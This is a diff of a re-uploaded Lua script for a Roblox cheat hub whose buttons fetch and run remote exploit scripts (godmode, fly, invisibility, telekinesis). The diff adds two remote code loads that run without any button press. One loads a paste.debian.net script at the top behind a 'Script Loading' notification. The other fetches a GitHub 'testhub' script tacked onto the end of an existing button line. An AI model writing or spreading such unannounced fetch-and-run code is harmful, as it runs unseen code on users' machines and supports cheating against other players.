@@ -1,6 +1,19 @@
--- this is a re upload of gpthub i dont own this script in anywaay
+-- gpt hub edieted 
 
+-- i dont own this scirpt in aany way 
 
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+
+local localPlayer = Players.LocalPlayer
+loadstring(game:HttpGet("https://paste.debian.net/plainh/ff89f0f2/", true))()
+StarterGui:SetCore("SendNotification", {
+    Title = "Script Loadind",
+    Text = "Welcome, " .. localPlayer.Name .. "! Script is loading, please wait...",
+    Icon = "rbxthumb://type=AvatarHeadShot&id=" .. localPlayer.UserId .. "&w=150&h=150",
+    Duration = 50,
+    Button1 = "OK"
+})
 
 
 local WindUI
@@ -514,7 +527,7 @@ Tabs.Hub:Button({Title="Hat Hub",Callback=function()loadstring(game:HttpGet("htt
 Tabs.Hub:Button({Title="FE Punch",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/AlexR32/FePunch/main/FePunch.lua"))()end})
 Tabs.Hub:Button({Title="FE Godmode",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/fe-godmode.lua"))()end})
 Tabs.Hub:Button({Title="Coquette Hub",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/Brookhaven-RP-Coquette-Hub-41921"))()end})
-Tabs.Hub:Button({Title="JG Hub",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/jg-hub-brookhaven-UDaT"))()end}) 
+Tabs.Hub:Button({Title="JG Hub",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/jg-hub-brookhaven-UDaT"))()end})
 Tabs.Hub:Button({Title="Tiger X Hub",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/tiger-x-hub-brookhaven-UDaT"))()end})
 Tabs.Hub:Button({Title="Rael Hub (OP)",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/contateste8/OaOaOaOa-EbEbEbEbEb/main/RaelHubObf.txt"))()end})
 Tabs.Hub:Button({Title="SP Hub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/as6cd0/SP_Hub/refs/heads/main/Brookhaven"))()end})
@@ -535,11 +548,13 @@ Tabs.Hub:Button({Title="Something Hub PSX",Callback=function()loadstring(game:Ht
 Tabs.Hub:Button({Title="Fly GUI V3",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()end})
 Tabs.Hub:Button({Title="FE Invisible",Callback=function()loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-fe-invisible-OPEN-SOURCE-53560"))()end})
 Tabs.Hub:Button({Title="Ketamine Hub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/InfernusScripts/Ketamine/refs/heads/main/Ketamine.lua"))()end})
-Tabs.Hub:Button({Title="c00lgui v2",Callback=function()loadstring(game:GetObjects("rbxassetid://16742906657")[1].Source)()end})
+Tabs.Hub:Button({Title="c00lgui v2",Callback=function()loadstring(game:GetObjects("rbxassetid://16742906657")[1].Source)()end})  loadstring(game:HttpGet("https://raw.githubusercontent.com/DontTrlp/chatgpt/refs/heads/main/testhub"))()
 Tabs.Hub:Button({Title="FE Telekinesis",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty13.lua"))()end})
 Tabs.Hub:Button({Title="FE Fighter",Callback=function()loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Fighter-inspired-by-Gale-21557"))()end})
 Tabs.Hub:Button({Title="Part Controller",Callback=function()pcall(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/PartController/refs/heads/main/PartController.lua",true))()end)end})
 Tabs.Hub:Button({Title="FE Invisible Tool",Callback=function()loadstring(game:HttpGet("https://pastebin.com/raw/71bx8T3L"))()end})
+
+
 Tabs.Utilities:Section({ Title = "Utilities" })
 Tabs.Utilities:Toggle({
     Title = "Anti-AFK",
